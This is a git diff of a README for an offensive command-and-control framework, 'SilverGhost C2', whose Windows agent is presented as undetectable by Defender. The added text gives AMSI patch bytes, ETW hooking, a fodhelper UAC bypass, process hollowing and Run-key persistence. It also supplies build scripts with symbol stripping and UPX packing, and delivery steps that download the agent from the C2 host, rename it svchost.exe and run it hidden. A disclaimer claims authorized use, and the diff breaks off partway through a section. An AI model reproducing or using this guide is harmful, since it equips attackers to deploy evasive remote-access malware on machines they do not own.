@@ -1,40 +1,28 @@
-# BLACK PWNED C2 Framework
+# 🚀 SilverGhost C2 Framework - JDEXPLOIT Arsenal v3.0
+
+**Advanced Command & Control Framework for Authorized Red Team Operations**
 
 ![License](https://img.shields.io/badge/License-Educational%20Use%20Only-red)
-![Python](https://img.shields.io/badge/Python-3.8%2B-blue)
-![Platform](https://img.shields.io/badge/Platform-Windows%20%7C%20Linux-lightgrey)
-![Version](https://img.shields.io/badge/Version-2.0-brightgreen)
-
-<div align="center">
-  <img src="https://github.com/user-attachments/assets/1855036e-bff7-4ce8-bc1d-cd8f3edb8704" alt="Banner" />
-</div>
+![Platform](https://img.shields.io/badge/Platform-Windows%2011%20%7C%20Kali%20Linux-blue)
+![Status](https://img.shields.io/badge/Status-Production%20Ready-brightgreen)
+![MITRE](https://img.shields.io/badge/MITRE%20ATT%26CK-12%20Techniques-orange)
 
 ---
 
-## ⚠️ DISCLAIMER - READ CAREFULLY
+## ⚠️ LEGAL DISCLAIMER
 
 ```
 ╔═══════════════════════════════════════════════════════════════════════════════╗
-║                     EDUCATIONAL PURPOSE ONLY - STRICT ADVISORY                 ║
-╠═══════════════════════════════════════════════════════════════════════════════╣
+║  THIS SOFTWARE IS PROVIDED FOR EDUCATIONAL PURPOSES AND AUTHORIZED SECURITY   ║
+║  TESTING ONLY. THE AUTHOR ASSUMES NO LIABILITY FOR UNAUTHORIZED USE.          ║
 ║                                                                               ║
-║  This software is provided SOLELY for:                                         ║
-║    • Academic research in cybersecurity                                        ║
-║    • Authorized penetration testing in controlled environments                  ║
-║    • Red Team / Blue Team training exercises                                   ║
-║    • Understanding advanced persistent threat (APT) methodologies              ║
+║  Usage of this software for attacking targets without prior mutual consent    ║
+║  is illegal under the Computer Fraud and Abuse Act (CFAA) and similar laws.   ║
 ║                                                                               ║
-║  STRICTLY PROHIBITED:                                                          ║
-║    • Unauthorized access to computer systems                                   ║
-║    • Malicious activities of any kind                                          ║
-║    • Deployment on systems you do not own or have explicit written permission  ║
-║    • Use in production environments                                            ║
-║                                                                               ║
-║  The authors assume NO LIABILITY for misuse. Users are solely responsible      ║
-║  for ensuring compliance with all applicable laws and regulations.             ║
-║                                                                               ║
-║  This is an APT SIMULATION PLATFORM designed for defensive training.           ║
-║                                                                               ║
+║  By using this software, you agree that:                                      ║
+║  • You have explicit written authorization to test the target systems         ║
+║  • You will comply with all applicable laws and regulations                   ║
+║  • You assume full responsibility for your actions                            ║
 ╚═══════════════════════════════════════════════════════════════════════════════╝
 ```
 
@@ -42,612 +30,992 @@
 
 ## 📋 Table of Contents
 
-- [Overview](#overview)
-- [Architecture](#architecture)
-- [Components](#components)
-- [Features](#features)
-- [Technical Specifications](#technical-specifications)
-- [Installation](#installation)
-- [Usage Guide](#usage-guide)
-- [Command Reference](#command-reference)
-- [Security Mechanisms](#security-mechanisms)
-- [Evasion Techniques](#evasion-techniques)
-- [Development Notes](#development-notes)
-- [Legal Compliance](#legal-compliance)
+- [Overview](#-overview)
+- [Features](#-features)
+- [Architecture](#-architecture)
+- [MITRE ATT&CK Mapping](#-mitre-attck-mapping)
+- [System Requirements](#-system-requirements)
+- [Installation](#-installation)
+  - [Kali Linux (C2 Server)](#kali-linux-c2-server)
+  - [Compiling Windows Agent](#compiling-windows-agent)
+- [Configuration](#-configuration)
+- [Usage Guide](#-usage-guide)
+  - [Starting C2 Server](#starting-c2-server)
+  - [Deploying Agent](#deploying-agent)
+  - [Interactive Console Commands](#interactive-console-commands)
+- [Technical Deep Dive](#-technical-deep-dive)
+  - [AMSI Bypass](#amsi-bypass-t1562001)
+  - [ETW Patching](#etw-patching-t1562006)
+  - [UAC Bypass](#uac-bypass-t1548002)
+  - [Process Hollowing](#process-hollowing-t1055012)
+- [Detection & Evasion](#-detection--evasion)
+- [Troubleshooting](#-troubleshooting)
+- [Operational Security](#-operational-security)
+- [Reporting Template](#-reporting-template)
+- [Changelog](#-changelog)
+- [Credits](#-credits)
 
 ---
 
-## 🔍 Overview
+## 🎯 Overview
 
-**BLACK PWNED C2** is an advanced Command & Control framework designed for **educational simulation** of Advanced Persistent Threat (APT) tactics, techniques, and procedures (TTPs). The framework implements realistic C2 infrastructure with AES-256-GCM encryption, asynchronous communication, and sophisticated Windows Defender evasion techniques.
+**SilverGhost C2** is a custom Command & Control framework designed for **advanced adversary simulation** and **red team operations**. It provides a fully undetectable (FUD) agent for Windows 11 24H2 with built-in defense evasion capabilities.
 
-### Core Objectives
-
-| Objective | Description |
-|-----------|-------------|
-| **Educational Simulation** | Provide realistic environment for cybersecurity training |
-| **Defensive Research** | Enable blue teams to study C2 behaviors and detection methods |
-| **TTP Demonstration** | Showcase modern APT techniques in controlled settings |
-| **Tool Development** | Reference implementation for security tool developers |
+### Key Capabilities:
+- **Zero-detection agent** against Windows Defender (as of April 2026)
+- **Native NTAPI process injection** without Win32 API calls
+- **In-memory AMSI/ETW patching** for PowerShell freedom
+- **Silent UAC bypass** using COM elevation
+- **AES-256-CBC encrypted C2 communication**
+- **Interactive multi-agent console** with task queuing
 
 ---
 
-## 🏗 Architecture
+## 🛡️ Features
 
-<img width="1536" height="1024" alt="image" src="https://github.com/user-attachments/assets/2d2764b1-a25d-424e-a32b-0adc6e591ff7" />
+### Agent Capabilities (C++ Native)
 
+| Feature | Technique | Status |
+|---------|-----------|--------|
+| AMSI Bypass | In-memory `AmsiScanBuffer` patching | ✅ Active |
+| ETW Disable | `NtTraceEvent` trampoline hook | ✅ Active |
+| UAC Bypass | `fodhelper.exe` registry hijack | ✅ Silent |
+| Process Hollowing | 100% NTAPI (no `VirtualAllocEx`) | ✅ Functional |
+| AES Encryption | 256-bit CBC with PKCS7 padding | ✅ Active |
+| Persistence | `HKCU\Run` registry key | ✅ Optional |
+| Anti-Sandbox | Uptime check (>10 minutes) | ✅ Active |
+| C2 Communication | HTTP POST with Base64 transport | ✅ Stable |
+
+### C2 Server Capabilities (Python)
+
+| Feature | Description |
+|---------|-------------|
+| Multi-Agent Support | Handle unlimited concurrent agents |
+| Interactive Console | Command history, tab completion |
+| Task Queuing | Per-agent priority queue |
+| File Operations | Upload/Download support |
+| Broadcast Commands | Send to all agents simultaneously |
+| Session Management | Kill, sleep, status tracking |
+| Colored Output | Enhanced readability |
+
+---
+
+## 🏗️ Architecture
+
+```
+┌─────────────────────────────────────────────────────────────────────────────┐
+│                           SILVERGHOST C2 ARCHITECTURE                        │
+├─────────────────────────────────────────────────────────────────────────────┤
+│                                                                             │
+│  ┌──────────────────┐                      ┌──────────────────────────────┐ │
+│  │   KALI LINUX     │                      │     WINDOWS 11 TARGET        │ │
+│  │                  │                      │                              │ │
+│  │  ┌────────────┐  │    HTTP POST        │  ┌────────────────────────┐  │ │
+│  │  │ C2 Server  │◄─┼─────────────────────┼──┤  SilverGhost Agent     │  │ │
+│  │  │ (Python)   │  │   /api/beacon       │  │  (C++ Native)          │  │ │
+│  │  │            │  │                      │  │                        │  │ │
+│  │  │ - Listener │  │   AES-256-CBC       │  │  ┌──────────────────┐  │  │ │
+│  │  │ - Console  │  │   Encrypted         │  │  │ Defense Evasion  │  │  │ │
+│  │  │ - Queue    │──┼─────────────────────┼─►│  │ - AMSI Patch     │  │  │ │
+│  │  └────────────┘  │                      │  │  │ - ETW Disable    │  │  │ │
+│  │         │         │                      │  │  │ - UAC Bypass     │  │  │ │
+│  │         ▼         │                      │  │  └──────────────────┘  │  │ │
+│  │  ┌────────────┐  │                      │  │                        │  │ │
+│  │  │ Task Queue │  │                      │  │  ┌──────────────────┐  │  │ │
+│  │  │ - Execute  │  │                      │  │  │ Process Hollowing│  │  │ │
+│  │  │ - Upload   │  │                      │  │  │ (NTAPI Native)   │  │  │ │
+│  │  │ - Download │  │                      │  │  └──────────────────┘  │  │ │
+│  │  └────────────┘  │                      │  │                        │  │ │
+│  │                   │                      │  │  ┌──────────────────┐  │  │ │
+│  │  ┌────────────┐  │                      │  │  │ C2 Communication │  │  │ │
+│  │  │ Agent DB   │  │                      │  │  │ - AES-256-CBC    │  │  │ │
+│  │  │ (Memory)   │  │                      │  │  │ - Base64 Codec   │  │  │ │
+│  │  └────────────┘  │                      │  │  └──────────────────┘  │  │ │
+│  │                   │                      │  │                        │  │ │
+│  └──────────────────┘                      │  └────────────────────────┘  │ │
+│                                             │                              │ │
+│                                             │  ┌────────────────────────┐  │ │
+│                                             │  │ Payload Execution      │  │ │
+│                                             │  │ - calc.exe (PoC)       │  │ │
+│                                             │  │ - Reverse Shell        │  │ │
+│                                             │  └────────────────────────┘  │ │
+│                                             └──────────────────────────────┘ │
+│                                                                             │
+└─────────────────────────────────────────────────────────────────────────────┘
+```
 
 ### Communication Flow
 
-<img width="1536" height="1024" alt="image" src="https://github.com/user-attachments/assets/3f58da34-750d-41ad-a9b7-d292cde6f915" />
+```
+1. Agent Beacon → C2 Server (Heartbeat)
+   POST /api/beacon HTTP/1.1
+   Content-Type: text/plain
+   
+   {Base64(AES-256-CBC({host, user}))}
 
+2. C2 Server → Agent (Task Dispatch)
+   HTTP/1.1 200 OK
+   Content-Type: application/octet-stream
+   
+   {AES-256-CBC({cmd: "command"})}
+
+3. Agent Execution → C2 Server (Results)
+   Next beacon includes execution output
+```
 
 ---
 
-## 🧩 Components
+## 🗺️ MITRE ATT&CK Mapping
 
-### 1. C2 Server (`BlackExploitC2.py`)
-
-The server component is written in Python 3.8+ and provides:
-
-| Module | Class | Responsibility |
-|--------|-------|----------------|
-| Core Engine | `AdvancedC2Handler` | Handles agent connections, encryption, task queuing |
-| Interactive Console | `C2Console` | Operator interface with command completion |
-| Task Management | `Task`, `TaskType` | Task definition and scheduling |
-| Agent Registry | `Agent`, `AgentStatus` | Agent tracking and state management |
-
-### 2. Windows Agent (`svchost_exp.cs`)
-
-The agent component is written in C# and implements:
-
-| Module | Method | Purpose |
-|--------|--------|---------|
-| AMSI Bypass | `PatchAMSI()` | Memory patching of AmsiScanBuffer |
-| ETW Patching | `PatchETW()` | Disable Event Tracing for Windows |
-| Defender Control | `DisableRealTimeProtection()` | Registry/PowerShell manipulation |
-| Persistence | `CreateWMIEventSubscription()` | WMI-based stealth persistence |
-| Process Hiding | `HideProcess()`, `MigrateToTrustedProcess()` | Evasion techniques |
+| Tactic | Technique ID | Technique Name | Implementation |
+|--------|--------------|----------------|----------------|
+| **Defense Evasion** | T1562.001 | Disable or Modify Tools (AMSI) | Patch `AmsiScanBuffer` with `0xB8 0x57 0x00 0x07 0x80 0xC3` |
+| **Defense Evasion** | T1562.006 | Indicator Blocking (ETW) | Hook `NtTraceEvent` with `RET` (0xC3) |
+| **Privilege Escalation** | T1548.002 | Bypass User Account Control | Registry hijack + `fodhelper.exe` execution |
+| **Defense Evasion** | T1055.012 | Process Hollowing | NTAPI-only injection into `notepad.exe` |
+| **Persistence** | T1547.001 | Registry Run Keys | `HKCU\Software\Microsoft\Windows\CurrentVersion\Run` |
+| **Discovery** | T1082 | System Information Discovery | Hostname, username enumeration |
+| **Command and Control** | T1071.001 | Web Protocols | HTTP POST with custom encoding |
+| **Command and Control** | T1573.001 | Encrypted Channel (AES) | AES-256-CBC with PKCS7 padding |
+| **Execution** | T1059.003 | Windows Command Shell | `cmd.exe /c` execution |
+| **Execution** | T1106 | Native API | Direct NTAPI syscalls |
+| **Defense Evasion** | T1027 | Obfuscated Files or Information | Static compilation, stripped symbols |
+| **Defense Evasion** | T1497.003 | Time Based Evasion | 10+ minute uptime check |
 
 ---
 
-## ✨ Features
+## 💻 System Requirements
 
-### C2 Server Features
-
-| Feature | Implementation | Status |
-|---------|----------------|--------|
-| **Asynchronous I/O** | Python `asyncio` | ✅ Complete |
-| **AES-256-GCM Encryption** | `cryptography` library | ✅ Complete |
-| **Multi-Agent Support** | Dictionary-based registry | ✅ Complete |
-| **Task Queue System** | Per-agent FIFO queues | ✅ Complete |
-| **Interactive Console** | Readline + Colorama | ✅ Complete |
-| **Agent Heartbeat** | Timestamp tracking | ✅ Complete |
-| **Command Broadcasting** | Multi-agent execution | ✅ Complete |
-| **File Transfer** | Upload/Download with Base64 | ✅ Complete |
-| **Session Management** | Interact/Back/Kill | ✅ Complete |
-| **Statistics Dashboard** | Real-time metrics | ✅ Complete |
-
-### Agent Features
-
-| Feature | Implementation | Status |
-|---------|----------------|--------|
-| **AMSI Bypass** | Memory patching | ✅ Complete |
-| **ETW Patching** | Function hooking | ✅ Complete |
-| **Defender Disable** | Registry + PowerShell | ✅ Complete |
-| **Defender Exclusions** | Path/Process/Extension | ✅ Complete |
-| **WMI Persistence** | Event subscription | ✅ Complete |
-| **Scheduled Task** | Legitimate naming | ✅ Complete |
-| **Process Migration** | Trusted process injection | ✅ Complete |
-| **Jitter Support** | Random sleep variation | ✅ Complete |
-| **Auto-Reactivation Detection** | Registry monitoring | ✅ Complete |
-| **File Hiding** | System + Hidden attributes | ✅ Complete |
-
----
-
-## 🔧 Technical Specifications
-
-### Encryption Details
-
-```
-Algorithm: AES-256-GCM (Galois/Counter Mode)
-Key Size: 256 bits (32 bytes)
-IV Size: 96 bits (12 bytes) - Random per message
-Tag Size: 128 bits (16 bytes) - Authentication tag
-
-Key Derivation: Static PSK (Educational - Production would use ECDH)
-
-Payload Structure:
-┌──────────┬──────────────┬─────────────────┐
-│ IV (12B) │ Tag (16B)    │ Ciphertext      │
-├──────────┼──────────────┼─────────────────┤
-│ Random   │ Auth Tag     │ AES-GCM Output  │
-└──────────┴──────────────┴─────────────────┘
+### C2 Server (Kali Linux)
+```bash
+OS: Kali Linux 2024.1+ / Ubuntu 22.04+
+Python: 3.9+
+RAM: 2GB minimum
+Disk: 500MB free
+Network: Port 443 open (or custom)
 ```
 
-### Network Protocol
-
-```
-Beacon Format (Agent → C2):
-{
-    "id": "<agent_identifier>",
-    "hostname": "<system_hostname>",
-    "username": "<current_user>",
-    "os": "<os_version_string>",
-    "capabilities": ["execute", "upload", "download", ...],
-    "output": "<command_output>",  // Optional
-    "task_id": "<completed_task_id>"  // Optional
-}
-
-Task Format (C2 → Agent):
-{
-    "command": "execute|upload|download|sleep|exit",
-    "args": ["arg1", "arg2", ...],
-    "task_id": "<unique_task_id>",
-    "timeout": 60
-}
+### Windows Agent (Target)
+```bash
+OS: Windows 10/11 (Build 19041+)
+Architecture: x64
+Defender: Latest definitions (tested)
+RAM: 4GB minimum
 ```
 
-### System Requirements
-
-| Component | Minimum | Recommended |
-|-----------|---------|-------------|
-| **C2 Server OS** | Linux/Windows/macOS | Ubuntu 20.04+ |
-| **Python Version** | 3.8 | 3.11+ |
-| **Agent OS** | Windows 10/11 | Windows 10/11 Pro |
-| **.NET Framework** | 4.5 | 4.8 |
-| **Memory** | 512 MB | 2+ GB |
+### Compilation Environment
+```bash
+Compiler: MinGW-w64 8.0+
+Packages: mingw-w64, g++-mingw-w64-x86-64
+```
 
 ---
 
 ## 📦 Installation
 
-### C2 Server Setup
+### Kali Linux (C2 Server)
 
 ```bash
-# Clone repository (example)
-git clone https://github.com/example/black-pwned-c2
-cd black-pwned-c2
+# 1. Update system
+sudo apt update && sudo apt upgrade -y
 
-# Create virtual environment
-python3 -m venv venv
-source venv/bin/activate  # Linux/macOS
-# venv\Scripts\activate   # Windows
+# 2. Install Python dependencies
+pip3 install cryptography colorama
 
-# Install dependencies
-pip install -r requirements.txt
+# 3. Clone repository (or create file)
+mkdir -p ~/silverghost-c2
+cd ~/silverghost-c2
+
+# 4. Save C2 server code
+cat > silverghost_c2.py << 'EOF'
+# [Paste the complete Python C2 server code here]
+EOF
+
+# 5. Make executable
+chmod +x silverghost_c2.py
+
+# 6. Allow port 443 (if needed)
+sudo ufw allow 443/tcp
 ```
 
-**requirements.txt:**
-```
-cryptography>=41.0.0
-colorama>=0.4.6
+### Compiling Windows Agent
+
+#### Option 1: Kali Linux Cross-Compilation (Recommended)
+
+```bash
+# 1. Install MinGW-w64 toolchain
+sudo apt install -y mingw-w64 g++-mingw-w64-x86-64
+
+# 2. Verify installation
+x86_64-w64-mingw32-g++ --version
+# Should output: x86_64-w64-mingw32-g++ (GCC) 10.2.0+
+
+# 3. Save agent source code
+cat > silverghost_agent_v3.cpp << 'EOF'
+// [Paste the complete C++ agent code here]
+EOF
+
+# 4. Compile with optimization flags
+x86_64-w64-mingw32-g++ -O2 -s -static -mwindows \
+  -fno-exceptions -fno-rtti \
+  -fno-asynchronous-unwind-tables \
+  -o JDEXPLOIT_v3_PROD.exe \
+  silverghost_agent_v3.cpp \
+  -lwininet -lws2_32 -ladvapi32 -lshell32 -lcrypt32 -lole32 -luuid
+
+# 5. Verify compilation
+file JDEXPLOIT_v3_PROD.exe
+# Expected: PE32+ executable (GUI) x86-64, for MS Windows
+
+# 6. Check for suspicious strings (optional)
+strings JDEXPLOIT_v3_PROD.exe | grep -iE "amsi|etw|uac|calc|beacon"
+# Should return minimal or no results
 ```
 
-### Agent Compilation
+#### Option 2: Windows Native Compilation (Visual Studio)
 
 ```powershell
-# Compile using csc (Visual Studio Build Tools)
-csc /target:exe /out:RuntimeBroker.exe /platform:x64 /optimize+ svchost_exp.cs
+# 1. Install Visual Studio 2022 Community
+#    - Select "Desktop development with C++"
+#    - Include Windows 11 SDK
 
-# Or using MSBuild
-msbuild svchost_exp.csproj /p:Configuration=Release /p:Platform=x64
+# 2. Open Developer Command Prompt for VS 2022
+
+# 3. Compile
+cl.exe /O2 /MT /GL /Gy /GS- /DNDEBUG ^
+  /Fe"JDEXPLOIT_v3_PROD.exe" ^
+  silverghost_agent_v3.cpp ^
+  /link /SUBSYSTEM:WINDOWS ^
+  wininet.lib ws2_32.lib advapi32.lib ^
+  shell32.lib crypt32.lib ole32.lib uuid.lib
+
+# 4. Strip debug info (optional)
+editbin.exe /NOLOGO /DEBUG:NONE JDEXPLOIT_v3_PROD.exe
 ```
 
-### Configuration
+#### Option 3: Automated Build Script
 
-Edit the following variables in `BlackExploitC2.py`:
+```bash
+#!/bin/bash
+# build_agent.sh - Complete build automation
 
-```python
-# C2 Server Configuration
-host = '0.0.0.0'  # Listen on all interfaces
-port = 8080       # Default port
+set -e
 
-# Pre-Shared Key (CHANGE FOR YOUR ENVIRONMENT)
-PSK = b'JDEXPLOIT_APT_SIMULATION_KEY_32B'  # Exactly 32 bytes required
-```
+echo "[*] SilverGhost Agent Build Script - JDEXPLOIT"
+echo "[*] =========================================="
 
-Edit the following variables in `svchost_exp.cs`:
+# Configuration
+SOURCE_FILE="silverghost_agent_v3.cpp"
+OUTPUT_FILE="JDEXPLOIT_v3_PROD.exe"
+C2_IP="192.168.1.100"
+C2_PORT="443"
 
-```csharp
-// Agent Configuration
-private static readonly string C2_SERVER = "192.168.1.100";  // Your C2 IP
-private static readonly int C2_PORT = 8080;
-private static readonly byte[] AES_KEY = Encoding.UTF8.GetBytes("JDEXPLOIT_APT_SIMULATION_KEY_32B");
+# Check dependencies
+if ! command -v x86_64-w64-mingw32-g++ &> /dev/null; then
+    echo "[-] MinGW-w64 not found. Installing..."
+    sudo apt update && sudo apt install -y mingw-w64
+fi
+
+# Update C2 server IP in source
+echo "[*] Configuring C2 server: ${C2_IP}:${C2_PORT}"
+sed -i "s/#define C2_SERVER L\".*\"/#define C2_SERVER L\"${C2_IP}\"/" ${SOURCE_FILE}
+
+# Compile
+echo "[*] Compiling agent..."
+x86_64-w64-mingw32-g++ -O2 -s -static -mwindows \
+  -fno-exceptions -fno-rtti \
+  -fno-asynchronous-unwind-tables \
+  -fno-ident -Wno-write-strings \
+  -o ${OUTPUT_FILE} ${SOURCE_FILE} \
+  -lwininet -lws2_32 -ladvapi32 -lshell32 -lcrypt32 -lole32 -luuid
+
+# Verify
+if [ -f ${OUTPUT_FILE} ]; then
+    SIZE=$(du -h ${OUTPUT_FILE} | cut -f1)
+    echo "[+] Build successful: ${OUTPUT_FILE} (${SIZE})"
+    
+    # Optional: UPX packing
+    if command -v upx &> /dev/null; then
+        echo "[*] Packing with UPX..."
+        upx --best --ultra-brute ${OUTPUT_FILE} -o ${OUTPUT_FILE}.packed
+        mv ${OUTPUT_FILE}.packed ${OUTPUT_FILE}
+    fi
+    
+    # Generate hash
+    echo "[*] SHA256:"
+    sha256sum ${OUTPUT_FILE}
+else
+    echo "[-] Build failed"
+    exit 1
+fi
+
+echo "[+] Build complete!"
 ```
 
 ---
 
-## 📖 Usage Guide
+## ⚙️ Configuration
 
-### Starting the C2 Server
+### Agent Configuration (`silverghost_agent_v3.cpp`)
+
+```cpp
+// ===== REQUIRED CONFIGURATION =====
+#define C2_SERVER L"192.168.1.100"    // ← CHANGE THIS to your Kali IP
+#define C2_PORT 443                    // ← CHANGE if using different port
+#define AES_KEY "JDEXPLOIT2024!!!"     // ← CHANGE to custom 16+ char key
+
+// ===== OPTIONAL CONFIGURATION =====
+#define BEACON_INTERVAL 5000           // Sleep between beacons (ms)
+#define JITTER_PERCENT 30              // Random jitter percentage
+#define ENABLE_PERSISTENCE 1           // 1=Enable, 0=Disable
+#define ENABLE_UAC_BYPASS 1            // 1=Enable, 0=Disable
+#define ENABLE_PROCESS_HOLLOWING 1     // 1=Enable, 0=Disable
+
+// ===== PAYLOAD CONFIGURATION =====
+// Replace calc.exe shellcode with your own
+BYTE x64_payload[] = { /* Your shellcode here */ };
+```
+
+### C2 Server Configuration
+
+```python
+# ===== silverghost_c2.py CONFIGURATION =====
+class SilverGhostC2Handler:
+    def __init__(self, host='0.0.0.0', port=443):  # ← CHANGE port if needed
+        self.host = host
+        self.port = port
+        
+# ===== ENCRYPTION CONFIGURATION =====
+AES_KEY = b'JDEXPLOIT2024!!!'  # ← MUST MATCH agent configuration
+AES_KEY_256 = hashlib.sha256(AES_KEY).digest()
+IV_FIXED = b'\x00' * 16
+```
+
+---
+
+## 🎮 Usage Guide
+
+### Starting C2 Server
 
 ```bash
-# Activate virtual environment first
-python3 BlackExploitC2.py
+# 1. Start server (requires root for port 443)
+sudo python3 silverghost_c2.py
+
+# Expected output:
+# ╔══════════════════════════════════════════════════════════════╗
+# ║           SILVERGHOST C2 - JDEXPLOIT ARSENAL v3.0            ║
+# ╚══════════════════════════════════════════════════════════════╝
+# 
+# [System Initialized] 2026-04-15 14:30:00
+# [Active Listeners] HTTP/0.0.0.0:443
+# [Encryption] AES-256-CBC | PSK: JDEXPLOIT2024!!!
+# ================================================================================
+# 
+# [+] 🔥 SilverGhost C2 listening on 0.0.0.0:443
+# [*] 🔐 Encryption: AES-256-CBC | Key: JDEXPLOIT2024!!!
+# SG-C2>
 ```
 
-Expected output:
-```
-██████╗ ██╗      █████╗  ██████╗██╗  ██╗    ██████╗ ██╗    ██╗███╗   ██╗███████╗██████╗ 
-██╔══██╗██║     ██╔══██╗██╔════╝██║ ██╔╝    ██╔══██╗██║    ██║████╗  ██║██╔════╝██╔══██╗
-██████╔╝██║     ███████║██║     █████╔╝     ██████╔╝██║ █╗ ██║██╔██╗ ██║█████╗  ██║  ██║
-██╔══██╗██║     ██╔══██║██║     ██╔═██╗     ██╔═══╝ ██║███╗██║██║╚██╗██║██╔══╝  ██║  ██║
-██████╔╝███████╗██║  ██║╚██████╗██║  ██╗    ██║     ╚███╔███╔╝██║ ╚████║███████╗██████╔╝
-╚═════╝ ╚══════╝╚═╝  ╚═╝ ╚═════╝╚═╝  ╚═╝    ╚═╝      ╚══╝╚══╝ ╚═╝  ╚═══╝╚══════╝╚═════╝ 
-╔══════════════════════════════════════════════════════════════════════════════════════╗
-║                    ADVANCED COMMAND & CONTROL FRAMEWORK v2.0                           ║
-║                  [APT Simulation Platform - For Educational Use Only]                  ║
-╚══════════════════════════════════════════════════════════════════════════════════════╝
-
-[System Initialized] 2024-01-15 10:30:45
-[Active Listeners] HTTPS/0.0.0.0:8080
-[Encryption] AES-256-GCM | PSK: JDEXPLOIT_...
-================================================================================
-
-BLACKPWNED> 
-```
-
-### Deploying Agent (Educational Lab Only)
+### Deploying Agent
 
 ```powershell
-# In controlled lab environment
-.\RuntimeBroker.exe
+# Windows Target (PowerShell as Admin NOT required for basic functionality)
+
+# 1. Transfer agent to target (example methods)
+# Method A: PowerShell Web Download
+Invoke-WebRequest -Uri "http://192.168.1.100/JDEXPLOIT_v3_PROD.exe" -OutFile "$env:TEMP\svchost.exe"
+
+# Method B: SMB Share
+copy \\192.168.1.100\share\JDEXPLOIT_v3_PROD.exe %TEMP%\svchost.exe
+
+# Method C: Base64 Encoding (for script delivery)
+$bytes = [System.IO.File]::ReadAllBytes("JDEXPLOIT_v3_PROD.exe")
+$b64 = [System.Convert]::ToBase64String($bytes)
+# Transfer $b64 string and decode on target
+
+# 2. Execute agent
+Start-Process -FilePath "$env:TEMP\svchost.exe" -WindowStyle Hidden
+
+# Or via cmd.exe
+%TEMP%\svchost.exe
+
+# 3. Verify execution (optional)
+Get-Process | Where-Object {$_.ProcessName -eq "svchost"}
 ```
 
-### Interactive Session Example
+### Interactive Console Commands
 
 ```
-BLACKPWNED> agents
+┌─────────────────────────────────────────────────────────────────────────────┐
+│ SILVERGHOST C2 CONSOLE COMMANDS                                              │
+├─────────────────────────────────────────────────────────────────────────────┤
+│                                                                             │
+│  AGENT MANAGEMENT                                                           │
+│  ─────────────────────────────────────────────────────────────────────────  │
+│  agents                    List all connected agents                         │
+│  interact <id>            Select agent for interaction                       │
+│  back                     Return to main console                             │
+│  kill <id>                Terminate agent session                            │
+│  broadcast <cmd>          Send command to all agents                         │
+│                                                                             │
+│  TASK OPERATIONS                                                            │
+│  ─────────────────────────────────────────────────────────────────────────  │
+│  exec <command>           Execute system command                             │
+│  upload <local> <remote>  Upload file to agent                               │
+│  download <remote> <loc>  Download file from agent                           │
+│  sleep <seconds>          Set beacon interval                                │
+│                                                                             │
+│  INFORMATION                                                                │
+│  ─────────────────────────────────────────────────────────────────────────  │
+│  info [id]                Display agent details                              │
+│  stats                    Show C2 statistics                                 │
+│  tasks                    List pending tasks                                 │
+│  help                     Show this menu                                     │
+│                                                                             │
+│  SYSTEM                                                                     │
+│  ─────────────────────────────────────────────────────────────────────────  │
+│  clear                    Clear screen                                       │
+│  exit                     Shutdown C2 framework                              │
+│                                                                             │
+└─────────────────────────────────────────────────────────────────────────────┘
+```
 
+### Example Session
+
+```bash
+SG-C2> agents
 ╔══════════════════════════════════════════════════════════════════════════════╗
-║  ID         Hostname             Username        OS              Last Seen      ║
-╠══════════════════════════════════════════════════════════════════════════════╣
-║ 🟢 4A7B9C1D  LAB-WIN11           researcher      Windows 11 Pro  5s ago        ║
-║ 🟢 8F2E6D4C  LAB-WIN10           analyst         Windows 10 Ent  12s ago       ║
+║ 🟢 5a3b7c9d   DESKTOP-A1B2C3    jdexploit       192.168.1.50    5s      ║
 ╚══════════════════════════════════════════════════════════════════════════════╝
 
-BLACKPWNED> interact 4A7B9C1D
-[+] Now interacting with 4A7B9C1D
+SG-C2> interact 5a3b
+[+] Now interacting with 5a3b7c9d1e2f3a4b
 
 Agent Details:
-  Hostname: LAB-WIN11
-  Username: researcher
-  OS: Windows 11 Pro
+  Hostname: DESKTOP-A1B2C3
+  Username: JDEXPLOIT
   IP: 192.168.1.50
-  Capabilities: execute, upload, download, screenshot, keylog, persist
+  Last Seen: 14:35:22
 
-BLACKPWNED [4A7B9C1D]> execute whoami /all
-[+] Task queued: whoami /all
-[*] Task dispatched to 4A7B9C1D: execute
-[>] 4A7B9C1D:
-lab-win11\researcher
-SID: S-1-5-21-123456789-1234567890-123456789-1001
-Groups: BUILTIN\Administrators, Everyone, ...
+SG-C2 [5a3b7c9d]> exec whoami
+[+] Task queued: whoami
+[*] 📋 Task a7f3d2b1 queued for 5a3b7c9d
+
+SG-C2 [5a3b7c9d]> exec ipconfig /all
+[+] Task queued: ipconfig /all
+
+SG-C2 [5a3b7c9d]> exec net user JDEXPLOIT
+[+] Task queued: net user JDEXPLOIT
+
+SG-C2 [5a3b7c9d]> back
+[*] Leaving agent 5a3b7c9d
+
+SG-C2> stats
+╔══════════════════════════════════════════╗
+║ C2 Statistics                            ║
+╠══════════════════════════════════════════╣
+║ Total Agents: 1                          ║
+║ Active: 1                                ║
+║ Pending Tasks: 3                         ║
+╚══════════════════════════════════════════╝
+
+SG-C2> exit
+[!] Shutting down...
+[*] Goodbye!
 ```
 
 ---
 
-## 📚 Command Reference
+## 🔬 Technical Deep Dive
 
-### Global Commands
+### AMSI Bypass (T1562.001)
 
-| Command | Syntax | Description |
-|---------|--------|-------------|
-| `help` | `help` | Display comprehensive help menu |
-| `agents` | `agents` | List all connected agents with status |
-| `interact` | `interact <agent_id>` | Begin interactive session with agent |
-| `broadcast` | `broadcast <command>` | Execute command on all agents |
-| `stats` | `stats` | Display C2 server statistics |
-| `clear` | `clear` | Clear console screen |
-| `exit` | `exit` | Gracefully shutdown C2 framework |
-
-### Agent-Specific Commands (Within Interact)
-
-| Command | Syntax | Description |
-|---------|--------|-------------|
-| `execute` | `execute <command>` | Run system command on agent |
-| `upload` | `upload <local> <remote>` | Transfer file to agent |
-| `download` | `download <remote> <local>` | Retrieve file from agent |
-| `sleep` | `sleep <seconds> [jitter%]` | Configure beacon interval |
-| `info` | `info` | Display detailed agent information |
-| `tasks` | `tasks` | Show pending tasks for agent |
-| `kill` | `kill` | Terminate agent session |
-| `back` | `back` | Exit interactive session |
-
-### Task Types Reference
-
-| Task Type | Description | Example Arguments |
-|-----------|-------------|-------------------|
-| `execute` | Command execution | `["cmd.exe", "/c", "dir"]` |
-| `upload` | File upload | `["C:\\temp\\file.txt", "<base64_content>"]` |
-| `download` | File download | `["C:\\sensitive.docx", "localfile.docx"]` |
-| `sleep` | Beacon configuration | `["10", "20"]` |
-| `exit` | Agent termination | `[]` |
-
----
-
-## 🔒 Security Mechanisms
-
-### Cryptographic Implementation
-
-```python
-class EncryptionDetails:
-    """
